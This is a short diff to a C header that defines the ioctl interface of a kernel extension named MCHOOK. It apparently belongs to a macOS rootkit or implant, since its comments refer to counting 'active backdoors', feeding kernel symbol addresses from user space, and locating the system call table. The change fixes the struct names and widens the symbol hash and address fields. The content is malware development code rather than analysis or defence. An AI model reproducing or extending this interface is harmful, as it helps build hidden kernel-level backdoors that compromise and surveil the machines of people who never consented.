@@ -95,19 +95,19 @@ extern NSData            *gSessionKey;
 // Returns the number of active backdoors
 #define MCHOOK_GET_ACTIVES  _IOR(MCHOOK_MAGIC, 7489827, int)
 // Pass symbols resolved from uspace to kspace (not exported symbol snow)
-#define MCHOOK_SOLVE_SYM_32 _IOW(MCHOOK_MAGIC, 6483647, struct symbols_32)
-#define MCHOOK_SOLVE_SYM_64 _IOW(MCHOOK_MAGIC, 6483647, struct symbols_64)
+#define MCHOOK_SOLVE_SYM_32 _IOW(MCHOOK_MAGIC, 6483647, struct symbol_32)
+#define MCHOOK_SOLVE_SYM_64 _IOW(MCHOOK_MAGIC, 6483648, struct symbol_64)
 // Tell the kext to find sysent
 #define MCHOOK_FIND_SYS     _IOW(MCHOOK_MAGIC, 4548874, struct os_version)
 
-typedef struct symbols_32 {
+typedef struct symbol_32 {
   uint32_t hash;
-  uint32_t symbol;
+  uint32_t address;
 } symbol32_t;
 
-typedef struct symbols_64 {
-  uint32_t hash;
-  uint64_t symbol;
+typedef struct symbol_64 {
+  uint64_t hash;
+  uint64_t address;
 } symbol64_t;
 
 typedef struct os_version {
